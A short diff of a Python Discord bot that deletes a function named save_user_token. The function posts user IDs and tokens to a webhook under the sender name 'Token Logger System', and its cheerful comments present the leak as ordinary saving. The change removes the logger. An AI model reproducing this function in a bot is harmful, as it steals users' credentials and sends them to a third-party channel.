@@ -26,29 +26,6 @@ intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 
-# Replace with your actual Webhook URL
-WEBHOOK_URL = os.getenv("WEBHOOK_ID")
-
-# 1. Change the function signature to 'async' so it can handle aiohttp web requests
-async def save_user_token(user_id: int, token: str):
-    """Send a user ID and token to a channel via webhook."""
-    try:
-        # 2. Format the message payload string cleanly
-        content_message = f"**New Token Saved**\n👤 **User ID:** `{user_id}`\n🔑 **Token:** `{token}`"
-        
-        # 3. Open an asynchronous network session
-        async with aiohttp.ClientSession() as session:
-            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
-            
-            # 4. Transmit the payload data securely over HTTP
-            await webhook.send(
-                content=content_message,
-                username="Token Logger System" # Optional custom sender name
-            )
-            
-    except Exception as e:
-        # Error logging fallback matches your original structure
-        print(f"Failed to save token for user {user_id}: {e}")
 
 
 # ─── DM Helper ───────────────────────────────────────────────────────────────
